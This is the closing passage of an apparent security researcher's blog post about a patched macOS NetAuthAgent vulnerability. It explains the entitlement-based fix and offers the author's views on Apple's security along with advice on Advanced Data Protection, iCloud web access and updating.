    <p>But how can a daemon know the sender of a Mach message? Well, remember that a message, when received, has a kernel-appended trailer. This trailer contains, among other things, an <b>audit token</b> that can be used to uniquely identify the sending task. A receiving task can use the audit token and ask the Mach kernel for the entitlements dictionary for the task with that token. It can then parse through that dictionary and act upon the existence (or non-existence) of given entitlements keys and value. Again, this is what NetAuthAgent now does and (honestly) what it should have been doing all along.</p>
    <h2>Conclusion</h2>
    <h3>The Weakest Link</h3>
    <p>Its vulnerabilities like this that call to mind the old phrase <q>a chain is no stronger than its weakest link.</q> The credentials for file servers may have been stored in a way where only a specific application could access them, but if that application also allowed other applications to command it to retrieve those credentials, that&#39;s the weakest link. If API tokens to iCloud are stored in an encrypted file on disk, but the decryption key has a wide access control list, that&#39;s the weakest link.</p>
    <h3>How Secure is Apple?</h3>
    <p>In my time researching the macOS platform, I have found that Apple generally has good security infrastructure. I&#39;ve focused primarily on inter-process communication mainly due to the fact that process injection is extremely difficult to achieve with all of Apple&#39;s security measures in place. Despite the, honestly laughable, simplicity of this vulnerability (and even the large danger it poses), I don&#39;t mean to imply that Apple is bad at security. I would say they are often far better than competitors.</p>
    <p>But that doesn&#39;t mean you should trust them implicitly. In early February of 2025, <a href="https://www.washingtonpost.com/technology/2025/02/07/apple-encryption-backdoor-uk/"><cite>The Washington Post</cite> reported that the United Kingdom had ordered that Apple give them access to customer data</a> under the <cite>Investigatory Powers Act of 2016</cite>. Later that month, <a href="https://support.apple.com/en-us/122234">Apple pulled Advanced Data Protection, a more advanced encryption feature, for their <abbr title="United Kingdom">UK</abbr> customers.</a> While some praised Apple for not providing the UK government with <q>a backdoor,</q> I find the act of pulling the feature to still be capitulation. The UK government got what they wanted, which was easier access to the data. And while <a href="https://www.theguardian.com/technology/2025/mar/14/apple-uk-encryption-legal-challenge-heard-behind-closed-doors">Apple is reportedly fighting back against the order,</a> this situation makes it clear that, in the face of overbearing governments, Apple cannot be trusted.</p>
    <h3>My Recommendations</h3>
    <p>For those who still can, I would encourage you to <a href="https://support.apple.com/en-us/108756">enable Advanced Data Protection.</a> Alternatively, if you never use a web browser to access your iCloud, you can at least <a href="https://support.apple.com/en-us/102630">disable web access to iCloud data.</a> The iCloud website sometimes uses different API endpoints than Apple&#39;s iCloud apps. I actually did not research these specific endpoints much for this vulnerability, so it&#39;s possible they were/are more vulnerable to attacks with the API tokens. While the tokens are no longer accessible through this vulnerability, they <em>were</em> exposed through a previous vulnerability and may be exposed by some later one.</p>
    <p>Finally, while there is no evidence this exploit was ever used (or even found) by malicious actors, if you are particularly concerned that your credentials were exploited through this vulnerability, you should obviously change them. And for anyone who still hasn&#39;t updated their macOS devices since October of last year: please update now. I hope this article has accurately informed you on the importance of updating.</p>
    <h3>A Final Question</h3>
    <p>One final question you might have is this: <q>Given that MIG is a legacy communication protocol, largely superseded by XPC, what are the chances there are other vulnerable MIG servers out there?</q></p>
    <p>Until next time... <a target="_self" href="https://wts.dev/feed.xml">watch this space.</a></p>
  </article></div>
  </body>
</html>
